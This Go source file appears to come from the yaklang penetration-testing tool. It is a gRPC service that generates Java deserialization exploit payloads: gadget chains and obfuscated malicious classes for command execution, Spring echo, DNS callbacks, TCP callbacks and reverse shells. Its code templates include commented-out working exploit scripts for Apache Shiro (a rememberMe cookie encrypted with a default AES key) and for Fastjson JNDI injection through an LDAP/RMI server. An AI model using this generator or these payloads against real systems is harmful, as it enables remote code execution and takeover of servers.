package yakgrpc

import (
	"context"
	"fmt"
	"yaklang/common/log"
	"yaklang/common/utils"
	"yaklang/common/yak/yaklang"
	"yaklang/common/yak/yaklib/codec"
	"yaklang/common/yakgrpc/ypb"
	"yaklang/common/yso"
	"sort"
	"strings"
)

//func (s *Server) Version(ctx context.Context, _ *ypb.Empty) (*ypb.VersionResponse, error) {
//	return &ypb.VersionResponse{Version: secret.GetPalmVersion()}, nil
//}

type JavaBytesCodeType string

const (
	JavaBytesCodeType_FromBytes                 JavaBytesCodeType = "FromBytes"
	JavaBytesCodeType_RuntimeExec               JavaBytesCodeType = "RuntimeExec"
	JavaBytesCodeType_ProcessBuilderExec        JavaBytesCodeType = "ProcessBuilderExec"
	JavaBytesCodeType_ProcessImplExec           JavaBytesCodeType = "ProcessImplExec"
	JavaBytesCodeType_DNSlog                    JavaBytesCodeType = "DNSlog"
	JavaBytesCodeType_SpringEcho                JavaBytesCodeType = "SpringEcho"
	JavaBytesCodeType_ModifyTomcatMaxHeaderSize JavaBytesCodeType = "ModifyTomcatMaxHeaderSize"
	JavaBytesCodeType_TcpReverse                JavaBytesCodeType = "TcpReverse"
	JavaBytesCodeType_TcpReverseShell           JavaBytesCodeType = "TcpReverseShell"
)

type JavaClassGeneraterOption string

const (
	JavaClassGeneraterOption_ClassName                 JavaClassGeneraterOption = "ClassName"
	JavaClassGeneraterOption_IsConstructer             JavaClassGeneraterOption = "IsConstructer"
	JavaClassGeneraterOption_IsObfuscation             JavaClassGeneraterOption = "IsObfuscation"
	JavaClassGeneraterOption_Bytes                     JavaClassGeneraterOption = "Bytes"
	JavaClassGeneraterOption_Command                   JavaClassGeneraterOption = "Command"
	JavaClassGeneraterOption_Domain                    JavaClassGeneraterOption = "Domain"
	JavaClassGeneraterOption_Host                      JavaClassGeneraterOption = "Host"
	JavaClassGeneraterOption_Port                      JavaClassGeneraterOption = "Port"
	JavaClassGeneraterOption_TcpReverseToken           JavaClassGeneraterOption = "TcpReverseToken"
	JavaClassGeneraterOption_SpringHeaderKey           JavaClassGeneraterOption = "SpringHeaderKey"
	JavaClassGeneraterOption_SpringHeaderValue         JavaClassGeneraterOption = "SpringHeaderValue"
	JavaClassGeneraterOption_SpringParam               JavaClassGeneraterOption = "SpringParam"
	JavaClassGeneraterOption_IsSpringRuntimeExecAction JavaClassGeneraterOption = "IsSpringRuntimeExec"
	JavaClassGeneraterOption_IsSpringEchoBody          JavaClassGeneraterOption = "IsSpringEchoBody"
)

type JavaClassGeneraterOptionTypeVerbose string

const (
	String      JavaClassGeneraterOptionTypeVerbose = "String"
	Base64Bytes JavaClassGeneraterOptionTypeVerbose = "Base64Bytes"
	StringBool  JavaClassGeneraterOptionTypeVerbose = "StringBool"
	StringPort  JavaClassGeneraterOptionTypeVerbose = "StringPort"
)

type optionInfo struct {
	Name        string
	NameVerbose string
	Help        string
}

func getAllGadgetInfo() []*yso.GadgetInfo {
	res := []*yso.GadgetInfo{}
	names := []string{}
	for name, _ := range yso.GadgetInfoMap {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		res = append(res, yso.GadgetInfoMap[name])
	}
	return res
}

func checkGadgetIsTemplateSupported(gadget string) bool {
	if gadget == "None" {
		return true
	}
	info, ok := yso.GadgetInfoMap[gadget]
	if !ok {
		log.Error("gadget not found")
		return false
	}
	return info.IsSupportTemplate()
}
func getClassByGadgetName(name string) []optionInfo {
	if checkGadgetIsTemplateSupported(name) {
		return []optionInfo{
			{Name: "FromBytes", NameVerbose: "FromBytes", Help: "自定义字节码，BASE64格式"},
			{Name: "RuntimeExec", NameVerbose: "RuntimeExec", Help: ""},
			{Name: "ProcessBuilderExec", NameVerbose: "ProcessBuilderExec", Help: "可用于绕过RuntimeExec限制"},
			{Name: "ProcessImplExec", NameVerbose: "ProcessImplExec", Help: "可用于绕过RuntimeExec限制"},
			{Name: "DNSlog", NameVerbose: "DNSlog", Help: "用于DNSLog检测"},
			{Name: "SpringEcho", NameVerbose: "SpringEcho", Help: "Spring回显利用"},
			{Name: "ModifyTomcatMaxHeaderSize", NameVerbose: "ModifyTomcatMaxHeaderSize", Help: "修改TomcatMaxHeaderSize，可用于Shiro漏洞利用时绕过Header长度限制"},
			{Name: "TcpReverse", NameVerbose: "TcpReverse", Help: "反连到指定地址，并发送Token的内容"},
			{Name: "TcpReverseShell", NameVerbose: "TcpReverseShell", Help: "反弹Shell"},
		}
	} else if name == yso.URLDNS || name == yso.FindGadgetByDNS {
		return []optionInfo{
			{Name: "DNSlog", NameVerbose: "DNSlog", Help: "通过DNSLog检测"},
		}
	} else {
		return []optionInfo{
			{Name: "RuntimeExec", NameVerbose: "RuntimeExec", Help: ""},
		}
	}
}

func (s *Server) GetAllYsoGadgetOptions(ctx context.Context, _ *ypb.Empty) (*ypb.YsoOptionsWithVerbose, error) {
	allGadget := getAllGadgetInfo()
	var allGadgetName []*ypb.YsoOption
	for _, gadget := range allGadget {
		allGadgetName = append(allGadgetName, &ypb.YsoOption{Name: gadget.GetName(), NameVerbose: gadget.GetNameVerbose(), Help: gadget.GetHelp()})
	}
	return &ypb.YsoOptionsWithVerbose{
		Options: allGadgetName,
	}, nil
}
func (s *Server) GetAllYsoClassOptions(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoOptionsWithVerbose, error) {
	log.Infof("%v", req)
	options := getClassByGadgetName(req.Gadget)
	var allGadgetName []*ypb.YsoOption
	for _, gadget := range options {
		allGadgetName = append(allGadgetName, &ypb.YsoOption{Name: gadget.Name, NameVerbose: gadget.NameVerbose, Help: gadget.Help})
	}
	return &ypb.YsoOptionsWithVerbose{
		Options: allGadgetName,
	}, nil
}
func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoClassOptionsResponseWithVerbose, error) {
	commonOptions := []*ypb.YsoClassGeneraterOptionsWithVerbose{
		{Key: string(JavaClassGeneraterOption_IsConstructer), Value: "false", Type: string(StringBool), KeyVerbose: "构造方法", Help: "开启则使用构造函数，否则使用静态代码块触发恶意代码"},
		{Key: string(JavaClassGeneraterOption_IsObfuscation), Value: "true", Type: string(StringBool), KeyVerbose: "混淆", Help: "开启则混淆，否则不混淆"},
		{Key: string(JavaClassGeneraterOption_ClassName), Value: utils.RandStringBytes(8), Type: string(String), KeyVerbose: "类名", Help: "类名"},
	}
	if checkGadgetIsTemplateSupported(req.Gadget) {
		switch JavaBytesCodeType(req.Class) {
		case JavaBytesCodeType_FromBytes:
			return &ypb.YsoClassOptionsResponseWithVerbose{
				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
					{Key: string(JavaClassGeneraterOption_Bytes), Value: "", Type: string(Base64Bytes), KeyVerbose: "字节码", Help: "字节码"},
				}...),
			}, nil
		case JavaBytesCodeType_RuntimeExec, JavaBytesCodeType_ProcessImplExec, JavaBytesCodeType_ProcessBuilderExec:
			return &ypb.YsoClassOptionsResponseWithVerbose{
				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
					{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "命令", Help: "命令"},
				}...),
			}, nil
		case JavaBytesCodeType_DNSlog:
			return &ypb.YsoClassOptionsResponseWithVerbose{
				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
					{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog域名", Help: "填入DNSLog地址"},
				}...),
			}, nil
		case JavaBytesCodeType_SpringEcho:
			return &ypb.YsoClassOptionsResponseWithVerbose{
				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
					{Key: string(JavaClassGeneraterOption_IsSpringEchoBody), Value: "false", Type: string(StringBool), KeyVerbose: "Body输出", Help: "开启则在Body输出，否则在Header输出", BindOptions: map[string]*ypb.YsoClassOptionsResponseWithVerbose{
						"false": {
							Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
								{Key: string(JavaClassGeneraterOption_SpringHeaderKey), Value: "", Type: string(String), KeyVerbose: "HeaderKey", Help: "在Header回显的Key"},
								{Key: string(JavaClassGeneraterOption_SpringHeaderValue), Value: "", Type: string(String), KeyVerbose: "HeaderValue", Help: "在Header回显的Value"},
							},
						},
						"true": {
							Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
								{Key: string(JavaClassGeneraterOption_SpringParam), Value: "", Type: string(String), KeyVerbose: "命令", Help: "在Body回显的命令"},
							},
						},
					}},
					{Key: string(JavaClassGeneraterOption_IsSpringRuntimeExecAction), Value: "false", Type: string(StringBool), KeyVerbose: "执行命令", Help: "开启则执行命令并回显结果，否则只回显命令"},
					{Key: string(JavaClassGeneraterOption_SpringHeaderKey), Value: "", Type: string(String), KeyVerbose: "HeaderKey", Help: "在Header回显的Key"},
					{Key: string(JavaClassGeneraterOption_SpringHeaderValue), Value: "", Type: string(String), KeyVerbose: "HeaderValue", Help: "在Header回显的Value"},
					{Key: string(JavaClassGeneraterOption_SpringParam), Value: "", Type: string(String), KeyVerbose: "命令", Help: "在Body回显的命令"},
				}...),
			}, nil
		case JavaBytesCodeType_ModifyTomcatMaxHeaderSize:
			return &ypb.YsoClassOptionsResponseWithVerbose{Options: commonOptions}, nil
		case JavaBytesCodeType_TcpReverse:
			return &ypb.YsoClassOptionsResponseWithVerbose{
				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
					{Key: string(JavaClassGeneraterOption_Port), Value: "", Type: string(StringPort), KeyVerbose: "端口", Help: "端口"},
					{Key: string(JavaClassGeneraterOption_Host), Value: "", Type: string(String), KeyVerbose: "主机", Help: "主机"},
					{Key: string(JavaClassGeneraterOption_TcpReverseToken), Value: "", Type: string(String), KeyVerbose: "Token", Help: "反连的Token"},
				}...),
			}, nil
		case JavaBytesCodeType_TcpReverseShell:
			return &ypb.YsoClassOptionsResponseWithVerbose{
				Options: append(commonOptions, []*ypb.YsoClassGeneraterOptionsWithVerbose{
					{Key: string(JavaClassGeneraterOption_Port), Value: "", Type: string(StringPort), KeyVerbose: "端口", Help: "端口"},
					{Key: string(JavaClassGeneraterOption_Host), Value: "", Type: string(String), KeyVerbose: "主机", Help: "主机"},
				}...),
			}, nil
		default:
			return nil, utils.Errorf("not support gadget: %s and class: %s", req.Gadget, req.Class)
		}
	} else {
		if JavaBytesCodeType(req.Class) == JavaBytesCodeType_RuntimeExec {
			return &ypb.YsoClassOptionsResponseWithVerbose{Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
				{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "命令", Help: "命令"},
			}}, nil
		} else if JavaBytesCodeType(req.Class) == JavaBytesCodeType_DNSlog {
			return &ypb.YsoClassOptionsResponseWithVerbose{Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
				{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog域名", Help: "填入DNSLog地址"},
			}}, nil
		} else {
			return nil, utils.Errorf("not support gadget: %s and class: %s", req.Gadget, req.Class)
		}
	}
}

func optionsToYaklangCode(options []*ypb.YsoClassGeneraterOptionsWithVerbose, isClass bool) (string, map[string]string, string) {
	className := ""
	optionsCode := []string{}
	preOptionsCode := make(map[string]string)
	expect := ""
	args := []string{}
	for _, option := range options {
		switch JavaClassGeneraterOption(option.Key) {
		case JavaClassGeneraterOption_ClassName:
			className = option.Value
			//code := fmt.Sprintf("yso.%s(\"%s\")", "evilClassName", option.Value)
			code := "yso.evilClassName(className)"
			optionsCode = append(optionsCode, code)
		case JavaClassGeneraterOption_IsConstructer:
			if option.Value == "true" {
				code := fmt.Sprintf("yso.%s()", "useConstructorExecutor")
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_IsObfuscation:
			if option.Value == "true" {
				code := fmt.Sprintf("yso.%s()", "obfuscationClassConstantPool")
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_Bytes:
			if isClass {
				preOptionsCode[option.Key] = option.Value
			} else {
				code := fmt.Sprintf("yso.%s(\"%s\")", "useBase64BytesClass", option.Value)
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_Command:
			if isClass {
				preOptionsCode[option.Key] = option.Value
			} else {
				preOptionsCode[option.Key] = option.Value
				code := fmt.Sprintf("yso.%s(\"%s\")", "command", option.Value)
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_Domain:
			if isClass {
				preOptionsCode[option.Key] = option.Value
			} else {
				code := fmt.Sprintf("yso.%s(\"%s\")", "dnslogDomain", option.Value)
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_Port:
			if isClass {
				preOptionsCode[option.Key] = option.Value
			} else {
				code := fmt.Sprintf("yso.%s(%s)", "tcpReversePort", option.Value)
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_Host:
			if isClass {
				preOptionsCode[option.Key] = option.Value
			} else {
				code := fmt.Sprintf("yso.%s(\"%s\")", "tcpReverseHost", option.Value)
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_TcpReverseToken:
			code := fmt.Sprintf("yso.%s(\"%s\")", "tcpReverseToken", option.Value)
			optionsCode = append(optionsCode, code)
		case JavaClassGeneraterOption_SpringHeaderKey:
			if expect == "" {
				expect = "springHeaderValue"
				args = append(args, option.Value)
			}
			if expect == "springHeaderKey" {
				args = append(args, option.Value)
				code := fmt.Sprintf("yso.%s(%s, %s)", "springHeader", args[1], args[0])
				optionsCode = append(optionsCode, code)
				expect = ""
				args = []string{}
			}
		case JavaClassGeneraterOption_SpringHeaderValue:
			if expect == "" {
				expect = "springHeaderKey"
				args = append(args, option.Value)
			}
			if expect == "springHeaderValue" {
				args = append(args, option.Value)
				code := fmt.Sprintf("yso.%s(\"%s\", \"%s\")", "springHeader", args[0], args[1])
				optionsCode = append(optionsCode, code)
				expect = ""
				args = []string{}
			}
		case JavaClassGeneraterOption_SpringParam:
			code := fmt.Sprintf("yso.%s(\"%s\")", "springParam", option.Value)
			optionsCode = append(optionsCode, code)
		case JavaClassGeneraterOption_IsSpringRuntimeExecAction:
			if option.Value == "true" {
				code := fmt.Sprintf("yso.%s()", "springRuntimeExecAction")
				optionsCode = append(optionsCode, code)
			}
		case JavaClassGeneraterOption_IsSpringEchoBody:
			if option.Value == "true" {
				code := fmt.Sprintf("yso.%s()", "springEchoBody")
				optionsCode = append(optionsCode, code)
			}
		}
	}
	return className, preOptionsCode, strings.Join(optionsCode, ",")
}
func (s *Server) GenerateYsoCode(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoCodeResponse, error) {
	log.Infof("%v", req)
	if req == nil {
		return nil, utils.Error("request params is nil")
	}
	if req.Class == "" {
		return nil, utils.Error("not set class")
	}
	var gadget string
	if req.Gadget != "None" {
		gadget = fmt.Sprintf("Get%sJavaObject", req.Gadget)
	}
	//switch JavaSerilizedObjectType(req.Gadget) {
	//case JavaSerilizedObjectType_CommonsBeanutils1:
	//	gadget = "GetCommonsBeanutils1JavaObject"
	//case JavaSerilizedObjectType_CommonsBeanutils2:
	//	gadget = "GetCommonsBeanutils2JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections1:
	//	gadget = "GetCommonsCollections1JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections2:
	//	gadget = "GetCommonsCollections2JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections3:
	//	gadget = "GetCommonsCollections3JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections4:
	//	gadget = "GetCommonsCollections4JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections5:
	//	gadget = "GetCommonsCollections5JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections6:
	//	gadget = "GetCommonsCollections6JavaObject"
	//case JavaSerilizedObjectType_CommonsCollections7:
	//	gadget = "GetCommonsCollections7JavaObject"
	gadgetCodeTmp := `log.setLevel("info")
gadgetObj,err = yso.$gadgetFun($options)
if err {
	log.error("%v",err)
	return
}
gadgetBytes,err = yso.ToBytes(gadgetObj)
if err {
	log.error("%v",err)
	return
}

// 16进制展示payload
hexPayload = codec.EncodeToHex(gadgetBytes)    
println(hexPayload)

// // Shiro利用
// target = "127.0.0.1:8080"
// base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
// key,_ = codec.DecodeBase64(base64Key) // 生成key
// payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
// encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
// finalPayload = codec.EncodeBase64(append(key, encodePayload...))
// rsp,req,err = poc.HTTP(` + "`" + `GET /login HTTP/1.1
	//}
// Host: {{params(target)}}
// Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
// Accept-Encoding: gzip, deflate
// Accept-Language: zh-CN,zh;q=0.9
// Cache-Control: no-cache
// Cookie: rememberMe={{params(payload)}}
// User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
// ` + "`" + `,poc.params({"payload":finalPayload,"target":target})) // 发送payload
// str.SplitHTTPHeadersAndBodyFromPacket(rsp)
// log.info("发送Payload成功")
// log.info("响应包: ",string(rsp))	`

	classCodeTmp := `classObj,err = yso.$evilClass($options)
if err {
	log.error("%v",err)
	return
}
classBytes,err = yso.ToBytes(classObj)
if err {
	log.error("%v",err)
	return
}

// 16进制展示payload
hexPayload = codec.EncodeToHex(classBytes)    
println(hexPayload)

// // fastjson利用
// // 参数
// localIp = "1.1.1.1"
// port = 8086
// target = "1.1.1.1"

// httpReverseAddress = sprintf("http://%s:%d", localIp,port)
// ldapReverseAddress = sprintf("ldap://%s:%d/%s", localIp,port,className)
// s = facades.NewFacadeServer(
//     "0.0.0.0", 
//     port, 
//     facades.httpResource(className+".class",classBytes),
//     facades.ldapResourceAddr(className, httpReverseAddress),
//     facades.rmiResourceAddr(className, httpReverseAddress),
// )
// s.OnHandle(fn(msg){
//     log.info("收到请求: %v", msg)
// })
// go s.Serve()
// err = x.WaitConnect(sprintf("%s:%d",localIp,port), 2)
// if err{
//     log.error("连接 FacadeServer 失败，可能启动失败")
//     cancle()
//     return
// }

// rsp,req,err = poc.HTTP(` + "`" + `POST / HTTP/1.1
// Host: {{params(target)}}
// Content-Type: application/json

// {
//     "a":{
//         "@type":"java.lang.Class",
//         "val":"com.sun.rowset.JdbcRowSetImpl"
//     },
//     "b":{
//         "@type":"com.sun.rowset.JdbcRowSetImpl",
//         "dataSourceName":"{{params(reverseAddr)}}",
//         "autoCommit":true
//     }
// }
// ` + "`" + `,poc.params({"target":target,"reverseAddr":ldapReverseAddress}))

// log.info("发送Payload成功")
// log.info("响应包: %s",string(rsp))
`

	className, preOptionsCode, optionsCode := optionsToYaklangCode(req.Options, true)
	var code string
	switch JavaBytesCodeType(req.Class) {
	case JavaBytesCodeType_FromBytes:
		base64Bytes, ok := preOptionsCode[string(JavaClassGeneraterOption_Bytes)]
		if !ok {
			return nil, utils.Error("not set bytes")
		}
		bytesCode := `bytesCode,err =codec.DecodeBase64("%s")
if err != nil {
	println(err.Error())
	return
}`
		bytesCode = fmt.Sprintf(bytesCode, base64Bytes)
		if gadget != "" {
			optionsCode = "yso.useBytesEvilClass(bytesCode)," + optionsCode
			code = bytesCode + "\n" + utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
		} else {
			optionsCode = "bytesCode," + optionsCode
			generateCodeTmp := utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateClassObjectFromBytes", "options": optionsCode})
			code = bytesCode + "\n" + generateCodeTmp
		}
	case JavaBytesCodeType_RuntimeExec:
		command, ok := preOptionsCode[string(JavaClassGeneraterOption_Command)]
		if !ok {
			return nil, utils.Error("not set command")
		}
		if gadget != "" {
			if !checkGadgetIsTemplateSupported(req.Gadget) {
				//if checkIsRuntimeExecGadget(JavaSerilizedObjectType(req.Gadget)) {
				code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": "\"" + command + "\""})
			} else {
				optionsCode = "yso.useRuntimeExecEvilClass(\"" + command + "\")," + optionsCode
				code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
			}
		} else {
			optionsCode = fmt.Sprintf("\"%s\",", command) + optionsCode
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateRuntimeExecEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_ProcessImplExec:
		command, ok := preOptionsCode[string(JavaClassGeneraterOption_Command)]
		if !ok {
			return nil, utils.Error("not set command")
		}
		if gadget != "" {
			optionsCode = "yso.useProcessImplExecEvilClass(\"" + command + "\")," + optionsCode
			code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
		} else {
			optionsCode = fmt.Sprintf("\"%s\",", command) + optionsCode
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateProcessImplExecEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_ProcessBuilderExec:
		command, ok := preOptionsCode[string(JavaClassGeneraterOption_Command)]
		if !ok {
			return nil, utils.Error("not set command")
		}
		if gadget != "" {
			optionsCode = "yso.useProcessBuilderExecEvilClass(\"" + command + "\")," + optionsCode
			code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})

		} else {
			optionsCode = fmt.Sprintf("\"%s\",", command) + optionsCode
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateProcessBuilderExecEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_DNSlog:
		domain, ok := preOptionsCode[string(JavaClassGeneraterOption_Domain)]
		if !ok {
			return nil, utils.Error("not set domain")
		}
		if gadget != "" {
			if !checkGadgetIsTemplateSupported(req.Gadget) {
				code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": "\"" + domain + "\""})
			} else {
				optionsCode = "yso.useDNSLogEvilClass(\"" + domain + "\")," + optionsCode
				code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
			}

		} else {
			optionsCode = fmt.Sprintf("\"%s\",", domain) + optionsCode
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateDNSlogEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_SpringEcho:

		if gadget != "" {
			optionsCode = "yso.useSpringEchoTemplate()," + optionsCode
			code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
		} else {
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateSpringEchoEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_ModifyTomcatMaxHeaderSize:
		if gadget != "" {
			optionsCode = "yso.useModifyTomcatMaxHeaderSizeTemplate()," + optionsCode
			code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
		} else {
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateModifyTomcatMaxHeaderSizeEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_TcpReverse:
		host, ok := preOptionsCode[string(JavaClassGeneraterOption_Host)]
		if !ok {
			return nil, utils.Error("not set host")
		}
		port, ok := preOptionsCode[string(JavaClassGeneraterOption_Port)]
		if !ok {
			return nil, utils.Error("not set port")
		}
		if gadget != "" {
			optionsCode = "yso.useTcpReverseEvilClass(\"" + host + "\"," + port + ")," + optionsCode
			code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
		} else {
			optionsCode = fmt.Sprintf("\"%s\",%s,", host, port) + optionsCode
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateTcpReverseEvilClassObject", "options": optionsCode})
		}
	case JavaBytesCodeType_TcpReverseShell:
		host, ok := preOptionsCode[string(JavaClassGeneraterOption_Host)]
		if !ok {
			return nil, utils.Error("not set host")
		}
		port, ok := preOptionsCode[string(JavaClassGeneraterOption_Port)]
		if !ok {
			return nil, utils.Error("not set port")
		}
		if gadget != "" {
			optionsCode = "yso.useTcpReverseShellEvilClass(\"" + host + "\"," + port + ")," + optionsCode
			code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
		} else {
			optionsCode = fmt.Sprintf("\"%s\",%s,", host, port) + optionsCode
			code = utils.Format(classCodeTmp, map[string]string{"evilClass": "GenerateTcpReverseShellEvilClassObject", "options": optionsCode})
		}
	default:
		return nil, utils.Error("not support class")
	}
	if className != "" {
		code = fmt.Sprintf("className = \"%s\"\n", className) + code
	}
	return &ypb.YsoCodeResponse{Code: code}, nil
}
func (s *Server) GenerateYsoBytes(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoBytesResponse, error) {
	if req == nil {
		return nil, utils.Error("request params is nil")
	}
	codeRsp, err := s.GenerateYsoCode(ctx, req)
	if err != nil {
		return nil, utils.Errorf("GenerateYsoCode error: %v", err)
	}
	var code, className, fileName string
	for _, option := range req.Options {
		if strings.ToLower(option.Key) == strings.ToLower(string(JavaClassGeneraterOption_ClassName)) {
			className = option.Value
		}
	}
	if checkGadgetIsTemplateSupported(req.Gadget) && className == "" {
		return nil, utils.Error("not set className")
	}
	if req.Gadget == "None" {
		fileName = fmt.Sprintf("%s.class", className)
		code = codeRsp.Code + "\nout(classBytes)"
	} else {
		fileName = fmt.Sprintf("%s_%s.ser", req.Gadget, req.Class)
		code = codeRsp.Code + "\nout(gadgetBytes)"
	}
	engin := yaklang.New()
	var bytes []byte
	out := func(b []byte) {
		bytes = b
	}
	engin.SetVar("out", out)
	err = engin.SafeEval(ctx, code)
	if err != nil {
		return nil, utils.Errorf("Eval error: %v", err)
	}
	return &ypb.YsoBytesResponse{Bytes: bytes, FileName: fileName}, nil
}
func (s *Server) BytesToBase64(ctx context.Context, req *ypb.BytesToBase64Request) (*ypb.BytesToBase64Response, error) {
	return &ypb.BytesToBase64Response{Base64: codec.EncodeBase64(req.Bytes)}, nil
}

func (s *Server) YsoDump(ctx context.Context, req *ypb.YsoBytesObject) (*ypb.YsoDumpResponse, error) {
	if req == nil || req.Data == nil {
		return nil, utils.Error("request params is nil")
	}
	var result string
	obj1, err := yso.GetJavaObjectFromBytes(req.Data)
	if err != nil {
		obj2, err := yso.GenerateClassObjectFromBytes(req.Data)
		if err != nil {
			return nil, utils.Errorf("dump error: %v", err)
		}
		result, err = yso.Dump(obj2)
		if err != nil {
			return nil, utils.Errorf("dump error: %v", err)
		}
	} else {
		result, err = yso.Dump(obj1)
		if err != nil {
			return nil, utils.Errorf("dump error: %v", err)
		}
	}
	return &ypb.YsoDumpResponse{Data: result}, nil
}
